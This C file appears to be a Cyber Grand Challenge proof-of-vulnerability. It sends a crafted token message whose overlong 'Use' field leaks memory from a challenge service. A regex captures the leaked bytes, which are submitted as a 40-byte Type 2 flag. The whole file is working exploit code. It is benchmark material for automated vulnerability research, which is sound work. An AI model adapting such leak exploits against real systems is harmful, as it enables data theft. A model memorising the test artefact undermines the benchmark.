#include "libpov.h"
#include "cgc_atox.h"

int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type2();
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x6e\x65\x77\x54\x6f\x6b\x65\x6e\x73\x2c\x55\x73\x65\x72\x50\x61"
         "\x73\x73\x2c\x34\x31\x37\x35\x2c\x75\x73\x65\x72\x2f\x70\x61\x73"
         "\x73\x2c\x55\x73\x65\x3d\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43"
         "\x43\x43\x44\x44\x44\x44\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43"
         "\x43\x43\x44\x21";
      static unsigned int write_00000_00000_len = 68;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x71\x75\x69\x74\x2c\x20\x2c\x20\x2c\x20\x21";
      static unsigned int write_00001_00000_len = 11;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length cgc_read
      read_00000_len = 104;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      //**** cgc_read assign to var "TYPE2_VALUE" from pcre: Token=[0-9]{8};Expiration=[0-9]*;Use=AAAABBBBCCCCDDDDAAAABBBBCCCCD\?(.*)
      static char read_00000_regex[] = 
         "\x54\x6f\x6b\x65\x6e\x3d\x5b\x30\x2d\x39\x5d\x7b\x38\x7d\x3b\x45"
         "\x78\x70\x69\x72\x61\x74\x69\x6f\x6e\x3d\x5b\x30\x2d\x39\x5d\x2a"
         "\x3b\x55\x73\x65\x3d\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43"
         "\x43\x44\x44\x44\x44\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43"
         "\x43\x44\x5c\x3f\x28\x2e\x2a\x29";
      cgc_assign_from_pcre("TYPE2_VALUE", read_00000, read_00000_len - read_00000_ptr, read_00000_regex, 1);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);

   unsigned char *flag_string = NULL;
   unsigned int flag_string_len = 0;
   flag_string = cgc_append_var("TYPE2_VALUE", flag_string, &flag_string_len);

   unsigned char flag[40];
   // parse response
   for (unsigned int i = 0; i < 40; i++) {
      flag[i] = cgc_atox((char *)&(flag_string[i*4]));
   }
   //*** submitting type 2 POV results
   if(cgc_type2_submit(flag, 40))
      cgc__terminate(2);
}
